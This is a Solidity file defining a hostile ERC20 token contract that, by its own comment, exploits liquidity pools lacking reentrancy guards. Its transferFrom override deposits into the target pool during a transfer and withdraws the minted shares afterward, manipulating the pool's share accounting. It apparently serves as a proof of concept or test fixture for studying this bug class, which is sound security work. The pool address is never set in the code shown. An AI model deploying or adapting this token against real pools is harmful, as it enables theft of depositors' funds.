// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {IERC20, ERC20} from "./ERC20.sol";


interface IPool is IERC20 {
    // Deposit amount of underlying token returning the amount of shares minted to sender   
    function deposit(uint256 amount) external payable returns(uint256);

    // Withdraw shares and returns the anount of underlying token transfered to sender 
    function withdraw(uint256 shares) external returns (uint256);
}


/// @dev This asset exploits pools without re-entrancy guards.
contract Asset is ERC20 {

    address private _exploitablePool;
    bool private  _is_exploiting;

    function _isTimeToExploit(
        address from, address recipient
    ) private view returns (bool) {
        return (
            recipient == _exploitablePool &&
            from != _exploitablePool &&
            IPool(_exploitablePool).totalSupply() > 0 && 
            !_is_exploiting
        );
    }

    function transferFrom(
      address from, address recipient, uint256 amount
    ) virtual override external returns (bool) {

        uint256 shares;
        if (_isTimeToExploit(from, recipient)) {
            // Deposit into the pool
            _is_exploiting = true;  // Prevent infinite recursion
            shares = IPool(_exploitablePool).deposit(100);
            _is_exploiting = false;
        }

        bool success =  _transferFrom(from, recipient, amount);

        if (_isTimeToExploit(from, recipient)) {
            // Withdraw
            _is_exploiting = true;  // Prevent infinite recursion
            IPool(_exploitablePool).withdraw(shares);
            _is_exploiting = false;
        }

        return success;
    }
}
